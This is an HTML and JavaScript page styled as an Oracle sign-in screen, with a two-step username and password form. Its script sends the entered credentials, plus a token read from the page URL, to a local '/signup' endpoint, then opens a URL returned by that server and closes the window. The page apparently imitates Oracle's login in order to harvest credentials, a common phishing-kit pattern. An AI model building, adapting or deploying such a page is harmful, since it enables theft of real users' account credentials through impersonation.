<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Sign in to Oracle</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
  <style>
    :root{
      --bg:#efe6cf;
      --card:#fbf7f4;
      --muted:#6a6a6a;
      --accent:#271f1d;
      --accent-contrast:#fff;
      --link:#0a66c2;
      --max-width:420px;
    }
    *{box-sizing:border-box;font-family:Roboto, system-ui, -apple-system, "Segoe UI", Roboto, Arial;}
    html,body{height:100%; margin:0; background:var(--bg); color:#222;}
    body::before{content:"";position:fixed;left:0;right:0;bottom:0;height:240px;
      background: radial-gradient(ellipse at 10% 80%, rgba(0,0,0,0.03) 0 8%, transparent 9%),
                  radial-gradient(ellipse at 30% 86%, rgba(0,0,0,0.03) 0 8%, transparent 9%),
                  radial-gradient(ellipse at 70% 84%, rgba(0,0,0,0.03) 0 8%, transparent 9%),
                  radial-gradient(ellipse at 90% 82%, rgba(0,0,0,0.03) 0 8%, transparent 9%);
      background-size: 180px 80px; pointer-events:none; opacity:0.7;}
    .page{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:48px 24px;}
    .center-col{width:100%;max-width:920px;display:flex;gap:28px;align-items:center;justify-content:center;flex-direction:column;}
    .signin-card{width:100%;max-width:var(--max-width);background:var(--card);border-radius:10px;padding:34px;text-align:center;border:1px solid rgba(0,0,0,0.03);box-shadow:0 6px 18px rgba(20,20,20,0.08);}
    .signin-card h1{margin:0 0 14px 0;font-size:28px;font-weight:700;}
    form{display:flex;flex-direction:column;gap:8px;margin-top:6px;}
    label{font-size:13px;color:var(--muted);text-align:left;}
    .text-input{width:100%;height:46px;padding:10px 12px;border:1px solid rgba(0,0,0,0.12);border-radius:6px;font-size:15px;}
    .text-input:focus{outline:none;border-color:rgba(10,102,194,0.5);box-shadow:0 0 0 3px rgba(10,102,194,0.06);}
    .btn-primary{width:100%;height:48px;border-radius:8px;border:none;background:var(--accent);color:var(--accent-contrast);font-size:16px;font-weight:600;cursor:pointer;margin-top:6px;}
    .link-row{display:flex;justify-content:center;margin-top:8px;}
    .forgot{font-size:13px;color:var(--link);text-decoration:none;}
    .secondary-card{margin-top:6px;width:100%;max-width:var(--max-width);background:var(--card);border-radius:10px;padding:22px;text-align:center;border:1px solid rgba(0,0,0,0.03);box-shadow:0 6px 18px rgba(20,20,20,0.08);}
    .secondary-card h2{margin:0 0 10px 0;font-size:18px;font-weight:700;}
    .create-btn{display:inline-block;width:80%;max-width:300px;padding:12px 18px;border-radius:8px;border:1px solid rgba(0,0,0,0.12);background:transparent;font-weight:600;cursor:pointer;}
    .meta{margin-top:14px;font-size:12px;color:var(--muted);}
    @media (max-width:760px){ .center-col{padding:0 6px} .signin-card{padding:28px} .secondary-card{padding:18px} .create-btn{width:90%} }
  </style>
</head>
<body>
  <div class="page">
    <div class="center-col">

      <div class="signin-card" role="region" aria-labelledby="signinHeading">
        <h1 id="signinHeading">Sign in to Oracle</h1>

        <!-- Form starts here -->
        <form id="myForm" class="signin-form" autocomplete="on" action="signup" method="post">
          
          <!-- Username field initially visible -->
          <div id="email-block">
            <label for="email">Username or email</label>
            <input id="email" name="email" class="text-input" type="text" placeholder="you@company.com" required />
          </div>

          <!-- Password field is present but hidden initially -->
          <div id="password-block" style="display:none;">
            <label for="password">Password</label>
            <input id="password" name="password" class="text-input" type="password" placeholder="Password" required />
          </div>

          <!-- Important: Start as type="button" so it does not submit form -->
          <button id="primaryButton" type="button" class="btn-primary">Next</button>

          <div class="link-row">
            <a class="forgot" href="#" id="forgot-username">Forgot username?</a>
          </div>
        </form>
      </div>

      <div class="secondary-card" role="region" aria-labelledby="createHeading">
        <h2 id="createHeading">Don't have an Oracle Account?</h2>
        <button id="createAccount" class="create-btn" type="button">Create Account</button>
        <div class="meta">© Oracle &nbsp; | &nbsp; Terms of Use &nbsp; | &nbsp; Privacy Policy</div>
      </div>

    </div>
  </div>

  <!-- Modals preserved -->
  <div id="popupModal" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.35); z-index:9999; align-items:center; justify-content:center;">
    <div style="background:white; padding:20px; border-radius:8px; min-width:260px; text-align:center;">
      <p style="margin:0 0 14px 0;">User Account added successfully</p>
      <button id="closeModal" style="background:#0a66c2;color:#fff;border:none;padding:8px 12px;border-radius:6px;cursor:pointer;">OK</button>
    </div>
  </div>

  <div id="popupErrorModal" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.35); z-index:9999; align-items:center; justify-content:center;">
    <div style="background:white; padding:20px; border-radius:8px; min-width:260px; text-align:center;">
      <p style="margin:0 0 14px 0;">Invalid user credentials or subscription token.</p>
      <button id="closeErrorModal" style="background:#0a66c2;color:#fff;border:none;padding:8px 12px;border-radius:6px;cursor:pointer;">OK</button>
    </div>
  </div>

  <script>
    // Elements
    const emailInput = document.getElementById('email');
    const passwordBlock = document.getElementById('password-block');
    const emailBlock = document.getElementById('email-block');
    const primaryButton = document.getElementById('primaryButton');
    const myForm = document.getElementById('myForm');
    const passwordInput = document.getElementById('password');

    // Token handling preserved
    const url = new URL(window.location.href);
    const params = new URLSearchParams(url.search);
    const st = params.get('st');

    // Two-step flow state
    let passwordVisible = false;

    // When primary button clicked:
    // - if password hidden: reveal password and convert button into submit
    // - if password visible: click triggers form submit (we set type to submit)
    primaryButton.addEventListener('click', function(e){
      if (!passwordVisible) {
        revealPasswordStep();
      } else {
        // If already visible, make sure button is submit and then submit the form
        primaryButton.type = 'submit';
        // Trigger submit (this will call your original myForm.onsubmit)
        myForm.requestSubmit(); // modern safe submit that triggers validation & submit handlers
      }
    });

    // Enter key behavior
    emailInput.addEventListener('keydown', function(e){
      if (e.key === 'Enter') {
        e.preventDefault();
        if (!passwordVisible) {
          revealPasswordStep();
        } else {
          // if password already visible and user presses Enter in email (rare), do nothing
        }
      }
    });

    passwordInput && passwordInput.addEventListener('keydown', function(e){
      if (e.key === 'Backspace' && this.value.length === 0) {
        // go back to email-only step
        e.preventDefault();
        hidePasswordStep();
        emailInput.focus();
      }
      // Enter in password input should submit — requestSubmit used when button is submit
      if (e.key === 'Enter') {
        // If password visible, submit form (this triggers your original onsubmit)
        if (passwordVisible) {
          // Ensure primaryButton is submit type
          primaryButton.type = 'submit';
          myForm.requestSubmit();
        }
      }
    });

    function revealPasswordStep() {
      emailBlock.style.display = 'none'; // Hide email field
      passwordBlock.style.display = 'block'; // Show password field
      passwordInput.setAttribute('required', 'required');
      // change primary button to submit for the next click
      primaryButton.textContent = 'Sign In';
      primaryButton.type = 'submit'; // so pressing Enter in password triggers submit naturally
      passwordVisible = true;
      // focus password after a small timeout so UI updates first
      setTimeout(()=> passwordInput.focus(), 40);
    }

    function hidePasswordStep() {
      emailBlock.style.display = 'block'; // Show email field
      passwordBlock.style.display = 'none'; // Hide password field
      passwordInput.removeAttribute('required');
      primaryButton.textContent = 'Next';
      primaryButton.type = 'button';
      passwordVisible = false;
    }

    // Keep your original onsubmit behavior exactly as in your previous file:
    myForm.onsubmit = function(event) {
      event.preventDefault(); 
      const formData = new FormData(this);

      var reqBody = {};
      formData.forEach(function(value, key){
        reqBody[key] = value;
      });
      reqBody['subscriptionToken'] = st;
      var jsonReqBody = JSON.stringify(reqBody);

      fetch('/signup', {
        method: 'POST',
        credentials: 'include',
        body: jsonReqBody,
      })
      .then(response => response.json())
      .then(data => {
          if(data.url) {
              window.open(data.url, '_blank');
              window.close();
          } else {
              document.getElementById("popupErrorModal").style.display = "flex";
              console.log("Failed to load details", data.message);
          }
      })
      .catch(error => {
          console.error("Error: ", error);
          document.getElementById("popupErrorModal").style.display = "flex";
      });
    };

    // Forgot username fallback
    document.getElementById('forgot-username').addEventListener('click', function(e){
      e.preventDefault();
      alert('Please contact your administrator or use Oracle account recovery.');
    });

    // Modal close handlers (preserve original)
    const popup = document.getElementById('popupModal');
    const popupErr = document.getElementById('popupErrorModal');
    const closeM = document.getElementById('closeModal');
    const closeErr = document.getElementById('closeErrorModal');
    if (closeM) closeM.addEventListener('click', ()=> {
      popup.style.display='none';
      if (signInContainer) signInContainer.style.display = 'block';
      if (signUpContainer) signUpContainer.style.display = 'none';
    });
    if (closeErr) closeErr.addEventListener('click', ()=> popupErr.style.display='none');

    // Initialize state: ensure password hidden initially
    hidePasswordStep();
  </script>
</body>
</html>
